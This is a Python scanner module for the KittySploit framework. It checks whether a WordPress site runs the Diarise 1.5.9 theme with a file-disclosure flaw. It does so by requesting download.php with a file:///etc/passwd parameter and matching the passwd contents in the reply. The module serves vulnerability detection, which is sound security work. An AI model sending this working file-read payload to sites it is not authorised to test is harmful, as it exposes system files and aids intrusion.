#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Diarise theme version 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Diarise 1.5.9 - Arbitrary File Retrieval Detection',
        'description': 'WordPress Diarise theme version 1.5.9 suffers from a local file retrieval vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'packetstorm', 'wordpress', 'wp-theme', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/152773/WordPress-Diarise-1.5.9-Local-File-Disclosure.html',
            'https://cxsecurity.com/issue/WLB-2019050123',
            'https://woocommerce.com/?aff=1790',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress Diarise 1.5.9 - Arbitrary File Retrieval detected",
                path='/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd',
            )
            return True
        return False

